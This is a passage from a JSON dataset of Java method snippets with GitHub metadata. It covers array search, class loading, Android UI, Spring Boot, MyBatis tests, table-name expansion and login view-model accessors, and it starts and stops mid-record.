f++)\n\t\t\t\t\t\t\t\tfor(int g = 0; g < array[0][0][0][0][0][0].length; g++)\n\t\t\t\t\t\t\t\t\tfor(int h = 0; h < array[0][0][0][0][0][0][0].length; h++)\n\t\t\t\t\t\t\t\t\t\tfor(int i = 0; i < array[0][0][0][0][0][0][0].length; i++)\n\t\t\t\t\t\t\t\t\t\t\tif (array[a][b][c][d][e][f][g][h][i] == value)\n\t\t\t\t\t\t\t\t\t\t\t\treturn true;\n\t\treturn false;\n\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/test/resources/src/FindNArray.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55668, "method_name": "find10", "class_name": "FindNArray", "params": ["int", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "\tpublic static boolean find10(int value, int[][][][][][][][][][] array) {\n\t\tfor(int a = 0; a < array.length; a++)\n\t\t\tfor(int b = 0; b < array[0].length; b++)\n\t\t\t\tfor(int c = 0; c < array[0][0].length; c++)\n\t\t\t\t\tfor(int d = 0; d < array[0][0][0].length; d++)\n\t\t\t\t\t\tfor(int e = 0; e < array[0][0][0][0].length; e++)\n\t\t\t\t\t\t\tfor(int f = 0; f < array[0][0][0][0][0].length; f++)\n\t\t\t\t\t\t\t\tfor(int g = 0; g < array[0][0][0][0][0][0].length; g++)\n\t\t\t\t\t\t\t\t\tfor(int h = 0; h < array[0][0][0][0][0][0][0].length; h++)\n\t\t\t\t\t\t\t\t\t\tfor(int i = 0; i < array[0][0][0][0][0][0][0].length; i++)\n\t\t\t\t\t\t\t\t\t\t\tfor(int j = 0; j < array[0][0][0][0][0][0][0][0].length; j++)\n\t\t\t\t\t\t\t\t\t\t\t\tif (array[a][b][c][d][e][f][g][h][i][j] == value)\n\t\t\t\t\t\t\t\t\t\t\t\t\treturn true;\n\t\treturn false;\n\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/test/resources/src/FindNArray.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55669, "method_name": "main", "class_name": "ClassLoder", "params": ["String"], "throws": ["Exception"], "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args)throws Exception {\n\n        /**\n        Class clazz = Msg.class;\n        System.out.println(clazz.getClassLoader());  //\u5e94\u7528\u7a0b\u5e8f\u52a0\u8f7d\u5668\n        System.out.println(clazz.getClassLoader().getParent());    //\u6269\u5c55\u7c7b\u52a0\u8f7d\u5668   1.8\u4ee5\u540e\u662fplatformClassLoder\n        System.out.println(clazz.getClassLoader().getParent().getParent());\n         */\n        hzcClassLoader classLoader = new hzcClassLoader();\n        Class cls = classLoader.loadData(\"javaSenior.reflectStudy.Message\");\n        Object obj = cls.getDeclaredConstructor().newInstance();\n        Method method = cls.getDeclaredMethod(\"sebd\");\n        method.invoke(obj);\n\n\n\n\n    }", "url": "https://raw.githubusercontent.com/hzc869046779/JAVA-STUDY/master/src/javaSenior/reflectStudy/ClassLoder.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55670, "method_name": "loadData", "class_name": "hzcClassLoader", "params": ["String"], "throws": ["Exception"], "modifiers": ["public"], "return_type": "Class", "snippet": "    public Class loadData(String className) throws Exception{\n        byte []data = this.loadClassData();\n        if(data !=null){\n            return super.defineClass(className,data,0,data.length);\n        }\n        return null;\n\n    }", "url": "https://raw.githubusercontent.com/hzc869046779/JAVA-STUDY/master/src/javaSenior/reflectStudy/ClassLoder.java", "stars": "10", "class_props": {"extends": "ClassLoader", "implements": null, "modifiers": []}}, {"id": 55671, "method_name": "loadClassData", "class_name": "hzcClassLoader", "params": [], "throws": ["Exception"], "modifiers": ["private"], "return_type": "byte", "snippet": "    private byte[] loadClassData() throws Exception{\n        InputStream input = null;\n        ByteArrayOutputStream bos = null;\n        byte data[]=null;\n        try {\n            bos=new ByteArrayOutputStream();\n            input = new FileInputStream(new File(MESSAGE_CLASS_PATH));\n//            input.transferTo(bos);\n            data = bos.toByteArray();\n\n        }catch (Exception e){\n            e.printStackTrace();\n        }finally {\n           if(input!=null){\n               input.close();\n           }\n           if(bos!=null){\n               bos.close();\n           }\n        }\n        return data;\n    }", "url": "https://raw.githubusercontent.com/hzc869046779/JAVA-STUDY/master/src/javaSenior/reflectStudy/ClassLoder.java", "stars": "10", "class_props": {"extends": "ClassLoader", "implements": null, "modifiers": []}}, {"id": 55672, "method_name": "isUserMode", "class_name": "Board", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isUserMode() {\n        return userMode;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgerp/plugin/blow/model/Board.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55673, "method_name": "buildTree", "class_name": "Board", "params": ["List<Pair>", "Collection<CommonObjectLink>"], "throws": null, "modifiers": ["private"], "return_type": "Iterable<Item>", "snippet": "    private Iterable<Item> buildTree(List<Pair<Process, Map<String, Object>>> processes, Collection<CommonObjectLink> links) {\n        List<Item> itemList = processes.stream().map(p -> new Item(this, p)).collect(Collectors.toList());\n        Map<Integer, Item> itemMap = itemList.stream().collect(\n                Collectors.toMap(item -> item.getProcess().getId(), \n                        Function.identity()));\n\n        for (Item item : itemList) {\n            Item parent = root;\n            // \u043f\u043e\u0438\u0441\u043a \u0441\u0441\u044b\u043b\u043e\u043a \u043d\u0430 \u0434\u0430\u043d\u043d\u044b\u0439 \u043f\u0440\u043e\u0446\u0435\u0441\u0441\n            for (CommonObjectLink link : links)\n                if (item.getProcess().getId() == link.getLinkedObjectId() && link.getLinkedObjectType().equals(Process.LINK_TYPE_MADE)) {\n                    parent = itemMap.get(link.getObjectId());\n                    break;\n                }\n            parent.addChild(item);\n        }        \n        return itemList;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgerp/plugin/blow/model/Board.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55674, "method_name": "getConfig", "class_name": "Board", "params": [], "throws": null, "modifiers": ["public"], "return_type": "BoardConfig", "snippet": "    public BoardConfig getConfig() {\n        return config;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgerp/plugin/blow/model/Board.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55675, "method_name": "getRoot", "class_name": "Board", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Item", "snippet": "    public Item getRoot() {\n        return root;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgerp/plugin/blow/model/Board.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55676, "method_name": "getItems", "class_name": "Board", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Iterable<Item>", "snippet": "    public Iterable<Item> getItems() {\n        return items;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgerp/plugin/blow/model/Board.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55677, "method_name": "addItem", "class_name": "Board", "params": ["Item", "int", "int"], "throws": null, "modifiers": ["private"], "return_type": "int", "snippet": "    private int addItem(Item item, int lastIndex, int maxLastIndex) {\n        if (item.getProcess() != null) {\n            List<Item> queueCommon = queues.computeIfAbsent(0, id -> new ArrayList<>());\n            List<Item> queue =  queues.computeIfAbsent(item.getExecutorId(), id -> new ArrayList<>());\n            \n            log.debug(\"Adding: \" + item.getProcess().getId() + \"; lastIndex: \" + lastIndex + \"; maxLastIndex: \" + maxLastIndex \n                    + \"; executorId: \" + item.getExecutorId() + \"; queueSize: \" + queue.size() + \"; queueCommonSize: \" + queueCommon.size());\n            \n            if (item.getExecutorId() == 0) {\n                lastIndex = maxLastIndex + 1;\n                \n                while (queue.size() < lastIndex)\n                    queue.add(null);                \n                queue.add(item);\n            } else {\n                while (queue.size() <= lastIndex || queue.size() < queueCommon.size())\n                    queue.add(null);\n                queue.add(item);\n                \n                lastIndex = queue.size() - 1;\n            }\n            \n            log.debug(\"Added: \" + item.getProcess().getId() + \"; lastIndex: \" + lastIndex);\n        }\n        \n        if (maxLastIndex < lastIndex) {\n            maxLastIndex = lastIndex;\n            log.debug(\"maxLastIndex: \" + maxLastIndex);\n        }\n        \n        for (Item child : item.getChildren())\n            maxLastIndex = addItem(child, lastIndex, maxLastIndex);\n        \n        return maxLastIndex;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgerp/plugin/blow/model/Board.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55678, "method_name": "getLastIndex", "class_name": "Board", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getLastIndex() {\n        return lastIndex;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgerp/plugin/blow/model/Board.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55679, "method_name": "getQueues", "class_name": "Board", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Map<Integer,List>", "snippet": "    public Map<Integer, List<Item>> getQueues() {\n        return queues;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgerp/plugin/blow/model/Board.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55680, "method_name": "getExecutorItemCount", "class_name": "Board", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getExecutorItemCount(int executorId) {\n        int cnt = 0;\n        for (Item item : items)\n            if (item.hasExecutor(executorId))\n                cnt++;\n        return cnt;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgerp/plugin/blow/model/Board.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55681, "method_name": "getExecutors", "class_name": "Board", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<IdTitle>", "snippet": "    public List<IdTitle> getExecutors() {\n        List<IdTitle> executorColumns = new ArrayList<>(queues.size());\n        if (isUserMode()) {\n            for (User user : UserCache.getUserList()) {\n                if (!queues.containsKey(user.getId())) \n                    continue;\n                executorColumns.add(user);\n            }\n        } \n        return executorColumns;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgerp/plugin/blow/model/Board.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55682, "method_name": "parseNetworkResponse", "class_name": "MemoryCallBack", "params": ["Response", "int"], "throws": ["Exception"], "modifiers": ["public"], "return_type": "Boolean", "snippet": "    public Boolean parseNetworkResponse(Response response, int id) throws Exception {\n        return saveFile(response, id);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/utils/MemoryCallBack.java", "stars": "2", "class_props": {"extends": "Callback", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 55683, "method_name": "saveFile", "class_name": "MemoryCallBack", "params": ["Response", "int"], "throws": ["IOException"], "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean saveFile(Response response, final int id) throws IOException {\n        InputStream is = null;\n        byte[] buf = new byte[2048];\n        int len = 0;\n        try {\n            is = response.body().byteStream();\n            final long total = response.body().contentLength();\n\n            long sum = 0;\n\n            while ((len = is.read(buf)) != -1) {\n                sum += len;\n                final long finalSum = sum;\n                OkHttpUtils.getInstance().getDelivery().execute(new Runnable() {\n                    @Override\n                    public void run() {\n\n                        Debuger.printfLog(\"######### inProgress\" + finalSum * 1.0f / total);\n                        inProgress(finalSum * 1.0f / total, total, id);\n                    }\n                });\n            }\n            return true;\n\n        } finally {\n            try {\n                response.body().close();\n                if (is != null) is.close();\n            } catch (IOException e) {\n            }\n\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/utils/MemoryCallBack.java", "stars": "2", "class_props": {"extends": "Callback", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 55684, "method_name": "contextLoads", "class_name": "SpringBootStartApplicationTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void contextLoads() {\n    }", "url": "https://raw.githubusercontent.com/mqxu/spring-boot-review/master/spring-boot-start/src/test/java/com/soft1851/springboot/start/SpringBootStartApplicationTests.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 55685, "method_name": "valueOf", "class_name": "DvmLong", "params": ["VM", "long"], "throws": null, "modifiers": ["public", "static"], "return_type": "DvmLong", "snippet": "    public static DvmLong valueOf(VM vm, long i) {\n        return new DvmLong(vm, i);\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/linux/android/dvm/wrapper/DvmLong.java", "stars": "16", "class_props": {"extends": "DvmObject", "implements": null, "modifiers": ["public"]}}, {"id": 55686, "method_name": "toString", "class_name": "DvmLong", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String toString() {\n        return \"0x\" + Long.toHexString(value) + \"L\";\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/linux/android/dvm/wrapper/DvmLong.java", "stars": "16", "class_props": {"extends": "DvmObject", "implements": null, "modifiers": ["public"]}}, {"id": 55687, "method_name": "onDraw", "class_name": "Practice04ScaleView", "params": ["Canvas"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onDraw(Canvas canvas) {\n        super.onDraw(canvas);\n\n        int bitmapWidth = bitmap.getWidth();\n        int bitmapHeight = bitmap.getHeight();\n\n        //sx sy \u662f\u6a2a\u5411\u548c\u7eb5\u5411\u7684\u653e\u7f29\u500d\u6570\uff1b px py \u662f\u653e\u7f29\u7684\u8f74\u5fc3\n\n        canvas.save();\n        canvas.scale(1.3f, 1.3f, point1.x + bitmapWidth / 2, point1.y + bitmapHeight / 2);\n        canvas.drawBitmap(bitmap, point1.x, point1.y, paint);\n        canvas.restore();\n\n        canvas.save();\n        canvas.scale(0.6f, 1.6f, point2.x + bitmapWidth / 2, point2.y + bitmapHeight / 2);\n        canvas.drawBitmap(bitmap, point2.x, point2.y, paint);\n        canvas.restore();\n    }", "url": "https://raw.githubusercontent.com/Geekholt/Practice-CustomView/master/app/src/main/java/com/geekholt/practiceui/view/lesson4/Practice04ScaleView.java", "stars": "2", "class_props": {"extends": "View", "implements": null, "modifiers": ["public"]}}, {"id": 55688, "method_name": "onPrepareDialogBuilder", "class_name": "KeySelectDialogPreference", "params": ["Builder"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onPrepareDialogBuilder(Builder builder) {\n        super.onPrepareDialogBuilder(builder);\n\n        builder.setOnKeyListener(this);\n        builder.setNeutralButton(R.string.reset_key, new OnClickListener() {\n\n            @Override\n            public void onClick(DialogInterface dialog, int which) {\n                keyCode = 0;\n                valueTextView.setText(\"No Key\");\n                persistInt(keyCode); // Neutral is a 'negative' response to android, we save manually here.\n            }\n        });\n    }", "url": "https://raw.githubusercontent.com/quite/mumla/master/app/src/main/java/se/lublin/mumla/preference/KeySelectDialogPreference.java", "stars": "9", "class_props": {"extends": "DialogPreference", "implements": ["OnKeyListener"], "modifiers": ["public"]}}, {"id": 55689, "method_name": "onCreateDialogView", "class_name": "KeySelectDialogPreference", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "View", "snippet": "    protected View onCreateDialogView() {\n        LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(LayoutParams.MATCH_PARENT, LayoutParams.WRAP_CONTENT);\n        LinearLayout layout = new LinearLayout(getContext());\n        layout.setOrientation(LinearLayout.VERTICAL);\n        layout.setPadding(6,6,6,6);\n\n        TextView promptTextView = new TextView(getContext());\n        promptTextView.setText(R.string.pressKey);\n        promptTextView.setGravity(Gravity.CENTER_HORIZONTAL);\n\n        valueTextView = new TextView(getContext());\n        valueTextView.setTextSize(TypedValue.COMPLEX_UNIT_SP, 22);\n        valueTextView.setGravity(Gravity.CENTER_HORIZONTAL);\n        valueTextView.setPadding(0, 12, 0, 12);\n\n        TextView alertTextView = new TextView(getContext());\n        alertTextView.setText(R.string.pressKeyInfo);\n        alertTextView.setGravity(Gravity.CENTER_HORIZONTAL);\n        alertTextView.setTextSize(TypedValue.COMPLEX_UNIT_SP, 12);\n\n        layout.addView(promptTextView, params);\n        layout.addView(valueTextView, params);\n        layout.addView(alertTextView);\n\n        return layout;\n    }", "url": "https://raw.githubusercontent.com/quite/mumla/master/app/src/main/java/se/lublin/mumla/preference/KeySelectDialogPreference.java", "stars": "9", "class_props": {"extends": "DialogPreference", "implements": ["OnKeyListener"], "modifiers": ["public"]}}, {"id": 55690, "method_name": "onSetInitialValue", "class_name": "KeySelectDialogPreference", "params": ["boolean", "Object"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onSetInitialValue(boolean restorePersistedValue,\n            Object defaultValue) {\n        super.onSetInitialValue(restorePersistedValue, defaultValue);\n        if(restorePersistedValue)  {\n            keyCode = getPersistedInt(0);\n        } else {\n            keyCode = (Integer)defaultValue;\n        }\n    }", "url": "https://raw.githubusercontent.com/quite/mumla/master/app/src/main/java/se/lublin/mumla/preference/KeySelectDialogPreference.java", "stars": "9", "class_props": {"extends": "DialogPreference", "implements": ["OnKeyListener"], "modifiers": ["public"]}}, {"id": 55691, "method_name": "onDialogClosed", "class_name": "KeySelectDialogPreference", "params": ["boolean"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onDialogClosed(boolean positiveResult) {\n        if(positiveResult) {\n            persistInt(keyCode);\n        }\n\n        super.onDialogClosed(positiveResult);\n    }", "url": "https://raw.githubusercontent.com/quite/mumla/master/app/src/main/java/se/lublin/mumla/preference/KeySelectDialogPreference.java", "stars": "9", "class_props": {"extends": "DialogPreference", "implements": ["OnKeyListener"], "modifiers": ["public"]}}, {"id": 55692, "method_name": "onBindDialogView", "class_name": "KeySelectDialogPreference", "params": ["View"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onBindDialogView(View view) {\n        super.onBindDialogView(view);\n        if(keyCode == 0) {\n            valueTextView.setText(\"No Key\");\n        } else {\n            valueTextView.setText(KeyEvent.keyCodeToString(keyCode));\n        }\n    }", "url": "https://raw.githubusercontent.com/quite/mumla/master/app/src/main/java/se/lublin/mumla/preference/KeySelectDialogPreference.java", "stars": "9", "class_props": {"extends": "DialogPreference", "implements": ["OnKeyListener"], "modifiers": ["public"]}}, {"id": 55693, "method_name": "onKey", "class_name": "KeySelectDialogPreference", "params": ["DialogInterface", "int", "KeyEvent"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean onKey(DialogInterface dialog, int keyCode, KeyEvent event) {\n        if(keyCode != KeyEvent.KEYCODE_BACK) {\n            this.keyCode = keyCode;\n            valueTextView.setText(KeyEvent.keyCodeToString(keyCode));\n        } else {\n            dialog.dismiss();\n        }\n        return true;\n    }", "url": "https://raw.githubusercontent.com/quite/mumla/master/app/src/main/java/se/lublin/mumla/preference/KeySelectDialogPreference.java", "stars": "9", "class_props": {"extends": "DialogPreference", "implements": ["OnKeyListener"], "modifiers": ["public"]}}, {"id": 55694, "method_name": "main", "class_name": "QaApplication", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String[] args) {\n\t\tSpringApplication.run(QaApplication.class, args);\n\t}", "url": "https://raw.githubusercontent.com/1127140426/tensquare/master/tensquare_qa/src/main/java/com/tensquare/qa/QaApplication.java", "stars": "34", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55695, "method_name": "idWorker", "class_name": "QaApplication", "params": [], "throws": null, "modifiers": ["public"], "return_type": "IdWorker", "snippet": "\tpublic IdWorker idWorker(){\n\t\treturn new IdWorker(1, 1);\n\t}", "url": "https://raw.githubusercontent.com/1127140426/tensquare/master/tensquare_qa/src/main/java/com/tensquare/qa/QaApplication.java", "stars": "34", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55696, "method_name": "jwtUtil", "class_name": "QaApplication", "params": [], "throws": null, "modifiers": ["public"], "return_type": "JwtUtil", "snippet": "    public JwtUtil jwtUtil() {\n\t    return new JwtUtil();\n    }", "url": "https://raw.githubusercontent.com/1127140426/tensquare/master/tensquare_qa/src/main/java/com/tensquare/qa/QaApplication.java", "stars": "34", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55697, "method_name": "shouldFailOnDuplicatedId", "class_name": "IdConflictTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void shouldFailOnDuplicatedId() {\n    Configuration configuration = new Configuration();\n    when(() -> configuration.addMapper(IdConflictMapper.class));\n    then(caughtException()).isInstanceOf(RuntimeException.class)\n      .hasMessage(\"Result Maps collection already contains value for org.apache.ibatis.submitted.results_id.IdConflictMapper.userResult\");\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/results_id/IdConflictTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 55698, "method_name": "splitTables", "class_name": "TableExpandUtil", "params": ["DataBaseType", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "List<String>", "snippet": "    public static List<String> splitTables(DataBaseType dataBaseType,\n                                           String tables) {\n        List<String> splittedTables = new ArrayList<String>();\n\n        String[] tableArrays = tables.split(\",\");\n\n        String tableName = null;\n        for (String tableArray : tableArrays) {\n            Matcher matcher = pattern.matcher(tableArray.trim());\n            if (!matcher.matches()) {\n                tableName = tableArray.trim();\n                splittedTables.add(tableName);\n            } else {\n                String start = matcher.group(3).trim();\n                String end = matcher.group(4).trim();\n                String tmp = \"\";\n                if (Integer.valueOf(start) > Integer.valueOf(end)) {\n                    tmp = start;\n                    start = end;\n                    end = tmp;\n                }\n                int len = start.length();\n                String schema = null;\n                for (int k = Integer.valueOf(start); k <= Integer.valueOf(end); k++) {\n                    schema = (null == matcher.group(1)) ? \"\" : matcher.group(1)\n                            .trim();\n                    if (start.startsWith(\"0\")) {\n                        tableName = schema + matcher.group(2).trim()\n                                + String.format(\"%0\" + len + \"d\", k)\n                                + matcher.group(5).trim();\n                        splittedTables.add(tableName);\n                    } else {\n                        tableName = schema + matcher.group(2).trim()\n                                + String.format(\"%d\", k)\n                                + matcher.group(5).trim();\n                        splittedTables.add(tableName);\n                    }\n                }\n            }\n        }\n        return splittedTables;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/plugin/rdbms/util/TableExpandUtil.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 55699, "method_name": "expandTableConf", "class_name": "TableExpandUtil", "params": ["DataBaseType", "List<String>"], "throws": null, "modifiers": ["public", "static"], "return_type": "List<String>", "snippet": "    public static List<String> expandTableConf(DataBaseType dataBaseType,\n                                               List<String> tables) {\n        List<String> parsedTables = new ArrayList<String>();\n        for (String table : tables) {\n            List<String> splittedTables = splitTables(dataBaseType, table);\n            parsedTables.addAll(splittedTables);\n        }\n\n        return parsedTables;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/plugin/rdbms/util/TableExpandUtil.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 55700, "method_name": "on", "class_name": "SonyTelevision", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void on() {\n        // Switches on the TV by clicking on Button X1\n    }", "url": "https://raw.githubusercontent.com/piyush6348/Design-Patterns/master/Bridge%20Pattern/src/Television/SonyTelevision.java", "stars": "38", "class_props": {"extends": null, "implements": ["ITelevision"], "modifiers": ["public"]}}, {"id": 55701, "method_name": "off", "class_name": "SonyTelevision", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void off() {\n        // Switches on the TV by clicking on Button X2\n    }", "url": "https://raw.githubusercontent.com/piyush6348/Design-Patterns/master/Bridge%20Pattern/src/Television/SonyTelevision.java", "stars": "38", "class_props": {"extends": null, "implements": ["ITelevision"], "modifiers": ["public"]}}, {"id": 55702, "method_name": "setChannel", "class_name": "SonyTelevision", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setChannel(int channel) {\n        // Sets the channel on this television\n    }", "url": "https://raw.githubusercontent.com/piyush6348/Design-Patterns/master/Bridge%20Pattern/src/Television/SonyTelevision.java", "stars": "38", "class_props": {"extends": null, "implements": ["ITelevision"], "modifiers": ["public"]}}, {"id": 55703, "method_name": "setVolume", "class_name": "SonyTelevision", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setVolume(int volume) {\n        // Sets the volume on this television\n    }", "url": "https://raw.githubusercontent.com/piyush6348/Design-Patterns/master/Bridge%20Pattern/src/Television/SonyTelevision.java", "stars": "38", "class_props": {"extends": null, "implements": ["ITelevision"], "modifiers": ["public"]}}, {"id": 55704, "method_name": "getFieldOrder", "class_name": "VmRegionSubMapShortInfo64", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "List<String>", "snippet": "    protected List<String> getFieldOrder() {\n        return Arrays.asList(\"protection\", \"max_protection\", \"inheritance\", \"offset\", \"userTag\", \"refCount\", \"shadowDepth\", \"externalPager\", \"shareMode\");\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/ios/struct/kernel/VmRegionSubMapShortInfo64.java", "stars": "16", "class_props": {"extends": "UnicornStructure", "implements": null, "modifiers": ["public"]}}, {"id": 55705, "method_name": "getUsername", "class_name": "LoginVM", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getUsername() {\n        return username;\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/main/java/com/gardle/web/rest/vm/LoginVM.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55706, "method_name": "setUsername", "class_name": "LoginVM", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setUsername(String username) {\n        this.username = username;\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/main/java/com/gardle/web/rest/vm/LoginVM.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55707, "method_name": "getPassword", "class_name": "LoginVM", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getPassword() {\n        return password;\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/main/java/com/gardle/web/rest/vm/LoginVM.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55708, "method_name": "setPassword", "class_name": "LoginVM", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setPassword(String password) {\n        this.password = password;\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/main/java/com/gardle/web/rest/vm/LoginVM.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55709, "method_name": "isRememberMe", "class_name": "LoginVM", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Boolean", "snippet": "    public Boolean isRememberMe() {\n        return rememberMe;\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/main/java/com/gardle/web/rest/vm/LoginVM.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55710, "method_name": "setRememberMe", "class_name": "LoginVM", "params": ["Boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setRememberMe(Boolean rememberMe) {\n        this.rememberMe = rememberMe;\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/main/java/com/gardle/web/rest/vm/LoginVM.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55711, "method_name": "toString", "class_name": "LoginVM", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String toString() {\n        return \"LoginVM{\" +\n            \"username='\" + username + '\\'' +\n            \", rememberMe=\" + rememberMe +\n            '}';\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/main/java/com/gardle/web/rest/vm/LoginVM.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55712, "method_name": "gerarPorcentagemGreatReviewsPlataforma", "class_name": "GreatReviews", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void gerarPorcentagemGreatReviewsPlataforma(){\n        String line = \"\";\n        int contaReviews = 0;\n\n        Map<String, Info> map = new TreeMap<>();\n        File arq = new File(\"game-reviews.csv\");\n        SimpleReader file = new SimpleReader(arq.getAbsolutePath());\n\n        line = file.readLine();\n        line = file.readLine();\n\n        while (line != null) {\n            String[] col = line.split(\";\");\n            contaReviews++;\n            \n            String platform = col[1];\n            String score_phrase = col[2];\n            \n            if (!map.containsKey(platform)) {\n                Info i = new Info();\n                i.totaisTitulos = 1;\n                if(score_phrase.equals(\"Great\")){\n                    i.totaisGreat++;\n                }\n                map.put(platform, i);\n            } else {\n                Info i = map.get(platform);\n                if(score_phrase.equals(\"Great\")){\n                    i.totaisGreat++;\n                }\n                